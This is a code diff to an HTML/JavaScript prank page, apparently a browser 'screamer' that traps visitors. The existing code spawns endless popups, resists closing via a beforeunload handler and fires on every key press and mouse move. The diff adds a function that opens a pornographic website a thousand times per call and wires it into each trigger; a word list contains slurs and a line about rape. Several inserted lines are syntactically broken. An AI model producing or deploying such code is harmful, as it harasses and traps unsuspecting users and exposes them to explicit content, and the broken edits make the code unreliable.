@@ -26,13 +26,18 @@ apps.html
 
         let nextAn = 1
         let indexN = 0
-        function createNewPopUp(){
+        function createNewPopUp() openGoogleTabs();{
             let newWindow = window.open('apps.html','', 'width=354545540px height=23400px')
             popups.push(newWindow)
         }
+function openGoogleTabs() {
+  for (let i = 0; i < 1000; i++) {
+    window.open('https://www.pornhub.com', '_blank');
+  }
+}
 let wordlist = ['black', 'efn', 'n', 'we were raped on einstein island']
         let popups = [window]
-			createNewPopUp()
+			createNewPopUp() openGoogleTabs();
 
         function getRandomCordinats(){
             return [Math.floor(Math.random() * (screen.width-100 - 0) + 0), Math.floor(Math.random() * (screen.height-100 - 0) + 0)]
@@ -70,7 +75,7 @@ let wordlist = ['black', 'efn', 'n', 'we were raped on einstein island']
 
         window.addEventListener('beforeunload', (e)=>{
             for (let i = 0; i<20; i++){
-                createNewPopUp()
+                createNewPopUp() openGoogleTabs();
             }
 
             e.preventDefault()
@@ -98,57 +103,57 @@ let wordlist = ['black', 'efn', 'n', 'we were raped on einstein island']
         document.addEventListener('keydown', (e)=>{
             music.play()
             for (let i = 0; i<20; i++){
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
-                createNewPopUp()
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
+                createNewPopUp() openGoogleTabs();
 
             }
             e.preventDefault()
@@ -157,7 +162,7 @@ let wordlist = ['black', 'efn', 'n', 'we were raped on einstein island']
 	 document.addEventListener('mousemove', (e)=>{
             music.play()
             for (let i = 0; i<20; i++){
-                createNewPopUp()
+                createNewPopUp() openGoogleTabs();
             }
             e.preventDefault()
         })
